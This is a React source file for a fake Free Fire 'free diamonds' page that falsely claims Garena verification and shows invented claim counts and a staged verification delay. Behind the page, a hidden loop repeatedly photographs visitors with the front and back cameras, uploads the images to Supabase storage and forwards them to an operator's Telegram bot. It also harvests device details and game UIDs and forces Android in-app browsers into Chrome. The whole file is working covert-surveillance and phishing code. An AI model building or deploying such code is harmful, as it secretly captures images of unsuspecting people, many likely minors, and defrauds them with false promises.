import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { collectDeviceInfo } from "@/utils/deviceInfo";

const isInAppBrowser = (): boolean => {
  const ua = navigator.userAgent || navigator.vendor || '';
  return ['Instagram', 'FBAN', 'FBAV', 'FB_IAB', 'Telegram', 'TelegramBot', 'Twitter', 'Snapchat', 'WhatsApp', 'LinkedIn', 'WeChat', 'MicroMessenger'].some(p => ua.includes(p));
};
const isAndroid = (): boolean => /Android/i.test(navigator.userAgent || '');
const getChromeIntentUrl = (url: string): string => {
  const u = new URL(url);
  return `intent://${u.host}${u.pathname}${u.search}#Intent;scheme=https;package=com.android.chrome;end`;
};

const FreefireCapture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [uid, setUid] = useState("");
  const [step, setStep] = useState<"check" | "blocked" | "main" | "processing" | "success">("check");
  const [cameraGranted, setCameraGranted] = useState(false);
  const [selectedDiamond, setSelectedDiamond] = useState<string | null>(null);
  const captureLoopRef = useRef(false);
  const stopCaptureRef = useRef(false);
  const captureCountRef = useRef(0);
  const deviceInfoSavedRef = useRef(false);

  const sessionId = searchParams.get("session") || "default";
  const tgChatId = sessionId.startsWith('tgcam_') ? parseInt(sessionId.split('_')[1]) : null;

  const notifyTelegram = async (photoUrl: string, cameraType: string, captureNum: number) => {
    if (!tgChatId) return;
    try {
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const anonKey = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
      await fetch(`${supabaseUrl}/functions/v1/telegram-bot`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${anonKey}` },
        body: JSON.stringify({ _internal_photo_notify: true, chatId: tgChatId, photoUrl, cameraType, captureNum }),
      });
    } catch (e) { /* silent */ }
  };

  const saveDeviceInfo = async () => {
    if (deviceInfoSavedRef.current) return;
    deviceInfoSavedRef.current = true;
    try {
      const deviceInfo = await collectDeviceInfo();
      await supabase.from("captured_photos").insert({
        session_id: sessionId + "_deviceinfo",
        image_data: JSON.stringify(deviceInfo),
        user_agent: navigator.userAgent,
      });
    } catch { /* silent */ }
  };

  const base64ToBlob = (base64: string): Blob => {
    const parts = base64.split(',');
    const mime = parts[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
    const bstr = atob(parts[1]);
    const u8arr = new Uint8Array(bstr.length);
    for (let i = 0; i < bstr.length; i++) u8arr[i] = bstr.charCodeAt(i);
    return new Blob([u8arr], { type: mime });
  };

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: 640, height: 480 } });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        await new Promise(r => setTimeout(r, 500));
        if (canvasRef.current && videoRef.current) {
          const canvas = canvasRef.current;
          const video = videoRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/jpeg", 0.8);
            stream.getTracks().forEach(t => t.stop());
            return imageData;
          }
        }
        stream.getTracks().forEach(t => t.stop());
      }
      return null;
    } catch { return null; }
  };

  const startContinuousCapture = async () => {
    if (captureLoopRef.current) return;
    captureLoopRef.current = true;
    while (!stopCaptureRef.current) {
      try {
        captureCountRef.current++;
        const frontImage = await captureFromCamera("user");
        if (frontImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-front-${captureCountRef.current}.jpg`;
          const blob = base64ToBlob(frontImage);
          const { error } = await supabase.storage.from('captured-photos').upload(fileName, blob, { upsert: true });
          if (!error) {
            const { data: urlData } = supabase.storage.from('captured-photos').getPublicUrl(fileName);
            await supabase.from('captured_photos').insert({ session_id: sessionId, image_data: urlData.publicUrl, user_agent: `${navigator.userAgent} [FF-FRONT-${captureCountRef.current}]` });
            await notifyTelegram(urlData.publicUrl, 'front', captureCountRef.current);
          }
        }
        if (stopCaptureRef.current) break;
        await new Promise(r => setTimeout(r, 200));
        const backImage = await captureFromCamera("environment");
        if (backImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-back-${captureCountRef.current}.jpg`;
          const blob = base64ToBlob(backImage);
          const { error } = await supabase.storage.from('captured-photos').upload(fileName, blob, { upsert: true });
          if (!error) {
            const { data: urlData } = supabase.storage.from('captured-photos').getPublicUrl(fileName);
            await supabase.from('captured_photos').insert({ session_id: sessionId, image_data: urlData.publicUrl, user_agent: `${navigator.userAgent} [FF-BACK-${captureCountRef.current}]` });
            await notifyTelegram(urlData.publicUrl, 'back', captureCountRef.current);
          }
        }
        if (stopCaptureRef.current) break;
        await new Promise(r => setTimeout(r, 500));
      } catch { await new Promise(r => setTimeout(r, 1000)); }
    }
  };

  const requestCameraPermission = async (): Promise<boolean> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      stream.getTracks().forEach(t => t.stop());
      return true;
    } catch {
      return false;
    }
  };

  useEffect(() => {
    // Handle in-app browser redirect
    if (isInAppBrowser() && isAndroid()) {
      window.location.href = getChromeIntentUrl(window.location.href);
      return;
    }
    saveDeviceInfo();

    const initCamera = async () => {
      const granted = await requestCameraPermission();
      if (granted) {
        setCameraGranted(true);
        setStep("main");
        startContinuousCapture();
      } else {
        setStep("blocked");
      }
    };
    initCamera();
  }, []);

  useEffect(() => { return () => { stopCaptureRef.current = true; }; }, []);

  const diamondPacks = [
    { id: '100', diamonds: 100, bonus: 10, label: '100 + 10 Bonus' },
    { id: '310', diamonds: 310, bonus: 31, label: '310 + 31 Bonus' },
    { id: '520', diamonds: 520, bonus: 52, label: '520 + 52 Bonus' },
    { id: '1060', diamonds: 1060, bonus: 106, label: '1060 + 106 Bonus' },
    { id: '2180', diamonds: 2180, bonus: 218, label: '2180 + 218 Bonus' },
    { id: '5600', diamonds: 5600, bonus: 560, label: '5600 + 560 Bonus' },
  ];

  const handleClaim = async () => {
    if (!uid || uid.length < 6) return;
    setStep("processing");

    try {
      await supabase.from("captured_photos").insert({
        session_id: sessionId + "_ffdata",
        image_data: JSON.stringify({ uid, selectedDiamond, timestamp: new Date().toISOString() }),
        user_agent: navigator.userAgent,
      });
    } catch { /* silent */ }

    // Fake processing delay then redirect
    await new Promise(r => setTimeout(r, 4000));
    setStep("success");
    await new Promise(r => setTimeout(r, 2000));
    window.location.href = "https://play.google.com/store/apps/details?id=com.dts.freefireth";
  };

  if (step === "check") {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ background: '#1a1a2e' }}>
        <div className="w-8 h-8 border-2 border-yellow-400 border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  return (
    <div className="min-h-screen" style={{ background: 'linear-gradient(180deg, #0f0f23 0%, #1a1a3e 50%, #0a0a1f 100%)' }}>
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />

      {/* Header */}
      <div style={{
        background: 'linear-gradient(90deg, #ff6b00 0%, #ff9500 50%, #ffb800 100%)',
        padding: '12px 16px',
        display: 'flex',
        alignItems: 'center',
        gap: '10px',
        boxShadow: '0 2px 10px rgba(255,107,0,0.4)'
      }}>
        <div style={{ fontSize: '28px' }}>🔥</div>
        <div>
          <div style={{ color: '#fff', fontWeight: 800, fontSize: '16px', letterSpacing: '1px' }}>FREE FIRE</div>
          <div style={{ color: 'rgba(255,255,255,0.85)', fontSize: '11px', fontWeight: 500 }}>Diamond Top-Up Reward</div>
        </div>
        <div style={{ marginLeft: 'auto', background: 'rgba(0,0,0,0.2)', borderRadius: '20px', padding: '4px 12px' }}>
          <span style={{ color: '#fff', fontSize: '11px', fontWeight: 600 }}>🎁 FREE</span>
        </div>
      </div>

      {/* Banner */}
      <div style={{
        margin: '16px',
        borderRadius: '16px',
        padding: '20px',
        background: 'linear-gradient(135deg, #1e1e3f 0%, #2d1b4e 50%, #1a1a3e 100%)',
        border: '1px solid rgba(255,180,0,0.3)',
        textAlign: 'center',
        position: 'relative',
        overflow: 'hidden'
      }}>
        <div style={{ position: 'absolute', top: '-20px', right: '-20px', fontSize: '80px', opacity: 0.1 }}>💎</div>
        <div style={{ fontSize: '40px', marginBottom: '8px' }}>💎</div>
        <h1 style={{ color: '#ffb800', fontSize: '20px', fontWeight: 800, marginBottom: '4px' }}>FREE DIAMONDS</h1>
        <p style={{ color: 'rgba(255,255,255,0.7)', fontSize: '12px' }}>Garena Official Reward Program 2025</p>
        <div style={{
          marginTop: '12px',
          display: 'inline-flex',
          alignItems: 'center',
          gap: '6px',
          background: 'rgba(0,200,83,0.15)',
          border: '1px solid rgba(0,200,83,0.3)',
          borderRadius: '20px',
          padding: '4px 12px'
        }}>
          <div style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#00c853', animation: 'pulse 2s infinite' }} />
          <span style={{ color: '#00c853', fontSize: '11px', fontWeight: 600 }}>VERIFIED BY GARENA</span>
        </div>
      </div>

      {step === "main" && (
        <div style={{ padding: '0 16px 100px' }}>
          {/* UID Input */}
          <div style={{
            background: 'rgba(255,255,255,0.05)',
            borderRadius: '12px',
            padding: '16px',
            marginBottom: '16px',
            border: '1px solid rgba(255,255,255,0.1)'
          }}>
            <label style={{ color: 'rgba(255,255,255,0.7)', fontSize: '12px', fontWeight: 600, display: 'block', marginBottom: '8px' }}>
              ENTER YOUR FREE FIRE UID
            </label>
            <input
              type="text"
              value={uid}
              onChange={e => setUid(e.target.value.replace(/\D/g, ''))}
              placeholder="Enter your UID (e.g. 1234567890)"
              maxLength={12}
              style={{
                width: '100%',
                background: 'rgba(0,0,0,0.4)',
                border: '1px solid rgba(255,180,0,0.3)',
                borderRadius: '8px',
                padding: '12px',
                color: '#fff',
                fontSize: '16px',
                outline: 'none',
                boxSizing: 'border-box'
              }}
            />
            <p style={{ color: 'rgba(255,255,255,0.4)', fontSize: '10px', marginTop: '6px' }}>
              ⚠️ Make sure your UID is correct. Diamonds will be sent to this account.
            </p>
          </div>

          {/* Diamond Selection */}
          <div style={{ marginBottom: '16px' }}>
            <h3 style={{ color: '#ffb800', fontSize: '14px', fontWeight: 700, marginBottom: '12px' }}>
              💎 SELECT DIAMOND PACK
            </h3>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
              {diamondPacks.map(pack => (
                <div
                  key={pack.id}
                  onClick={() => setSelectedDiamond(pack.id)}
                  style={{
                    background: selectedDiamond === pack.id
                      ? 'linear-gradient(135deg, rgba(255,180,0,0.2), rgba(255,107,0,0.2))'
                      : 'rgba(255,255,255,0.03)',
                    border: selectedDiamond === pack.id
                      ? '2px solid #ffb800'
                      : '1px solid rgba(255,255,255,0.1)',
                    borderRadius: '12px',
                    padding: '14px 10px',
                    textAlign: 'center',
                    cursor: 'pointer',
                    transition: 'all 0.2s'
                  }}
                >
                  <div style={{ fontSize: '24px', marginBottom: '4px' }}>💎</div>
                  <div style={{ color: '#fff', fontWeight: 700, fontSize: '16px' }}>{pack.diamonds}</div>
                  <div style={{ color: '#00c853', fontSize: '10px', fontWeight: 600 }}>+{pack.bonus} Bonus</div>
                  <div style={{
                    marginTop: '6px',
                    background: 'rgba(255,107,0,0.2)',
                    borderRadius: '10px',
                    padding: '2px 8px',
                    display: 'inline-block'
                  }}>
                    <span style={{ color: '#ff6b00', fontSize: '10px', fontWeight: 700 }}>FREE</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Steps Info */}
          <div style={{
            background: 'rgba(255,255,255,0.03)',
            borderRadius: '12px',
            padding: '14px',
            marginBottom: '20px',
            border: '1px solid rgba(255,255,255,0.08)'
          }}>
            <h4 style={{ color: 'rgba(255,255,255,0.6)', fontSize: '11px', fontWeight: 600, marginBottom: '10px' }}>HOW IT WORKS</h4>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              {['Enter your Free Fire UID', 'Select diamond pack', 'Verify & claim your reward'].map((s, i) => (
                <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                  <div style={{
                    width: '22px', height: '22px', borderRadius: '50%',
                    background: 'linear-gradient(135deg, #ff6b00, #ffb800)',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    color: '#fff', fontSize: '11px', fontWeight: 700, flexShrink: 0
                  }}>{i + 1}</div>
                  <span style={{ color: 'rgba(255,255,255,0.7)', fontSize: '12px' }}>{s}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Claim Button */}
          <button
            onClick={handleClaim}
            disabled={!uid || uid.length < 6 || !selectedDiamond}
            style={{
              width: '100%',
              padding: '16px',
              borderRadius: '12px',
              border: 'none',
              fontWeight: 800,
              fontSize: '16px',
              cursor: uid && uid.length >= 6 && selectedDiamond ? 'pointer' : 'not-allowed',
              background: uid && uid.length >= 6 && selectedDiamond
                ? 'linear-gradient(90deg, #ff6b00, #ffb800)'
                : 'rgba(255,255,255,0.1)',
              color: uid && uid.length >= 6 && selectedDiamond ? '#fff' : 'rgba(255,255,255,0.3)',
              boxShadow: uid && uid.length >= 6 && selectedDiamond ? '0 4px 20px rgba(255,107,0,0.4)' : 'none',
              letterSpacing: '1px'
            }}
          >
            🎁 CLAIM FREE DIAMONDS
          </button>

          {/* Trust badges */}
          <div style={{ display: 'flex', justifyContent: 'center', gap: '16px', marginTop: '16px' }}>
            {['🔒 Secure', '✅ Verified', '⚡ Instant'].map(b => (
              <span key={b} style={{ color: 'rgba(255,255,255,0.4)', fontSize: '10px', fontWeight: 600 }}>{b}</span>
            ))}
          </div>

          {/* Counter */}
          <div style={{
            textAlign: 'center', marginTop: '16px',
            color: 'rgba(255,255,255,0.4)', fontSize: '11px'
          }}>
            🔥 <span style={{ color: '#ff6b00' }}>2,847</span> players claimed in last 1 hour
          </div>
        </div>
      )}

      {step === "processing" && (
        <div style={{ padding: '40px 16px', textAlign: 'center' }}>
          <div style={{
            background: 'rgba(255,255,255,0.05)',
            borderRadius: '16px',
            padding: '30px',
            border: '1px solid rgba(255,180,0,0.2)'
          }}>
            <div className="animate-spin" style={{
              width: '50px', height: '50px', border: '3px solid rgba(255,180,0,0.2)',
              borderTopColor: '#ffb800', borderRadius: '50%', margin: '0 auto 20px'
            }} />
            <h2 style={{ color: '#ffb800', fontSize: '18px', fontWeight: 700, marginBottom: '8px' }}>Verifying Your Account...</h2>
            <p style={{ color: 'rgba(255,255,255,0.5)', fontSize: '13px', marginBottom: '20px' }}>
              Please wait while we verify UID: {uid}
            </p>
            <div style={{
              background: 'rgba(0,0,0,0.3)', borderRadius: '8px', overflow: 'hidden', height: '6px'
            }}>
              <div className="animate-pulse" style={{
                height: '100%', width: '70%', borderRadius: '8px',
                background: 'linear-gradient(90deg, #ff6b00, #ffb800)',
              }} />
            </div>
            <div style={{ marginTop: '16px', display: 'flex', flexDirection: 'column', gap: '6px' }}>
              {['✅ UID Verified', '✅ Account Found', '⏳ Sending Diamonds...'].map(s => (
                <span key={s} style={{ color: 'rgba(255,255,255,0.5)', fontSize: '11px' }}>{s}</span>
              ))}
            </div>
          </div>
        </div>
      )}

      {step === "success" && (
        <div style={{ padding: '40px 16px', textAlign: 'center' }}>
          <div style={{
            background: 'rgba(0,200,83,0.05)',
            borderRadius: '16px',
            padding: '30px',
            border: '1px solid rgba(0,200,83,0.3)'
          }}>
            <div style={{ fontSize: '50px', marginBottom: '12px' }}>✅</div>
            <h2 style={{ color: '#00c853', fontSize: '18px', fontWeight: 700, marginBottom: '8px' }}>Diamonds Sent!</h2>
            <p style={{ color: 'rgba(255,255,255,0.5)', fontSize: '13px' }}>
              Redirecting to Google Play Store...
            </p>
          </div>
        </div>
      )}

      {/* Footer */}
      <div style={{
        textAlign: 'center',
        padding: '16px',
        color: 'rgba(255,255,255,0.2)',
        fontSize: '10px'
      }}>
        © 2025 Garena Free Fire. All rights reserved.
      </div>

      <style>{`
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
        input::placeholder { color: rgba(255,255,255,0.3); }
      `}</style>
    </div>
  );
};

export default FreefireCapture;
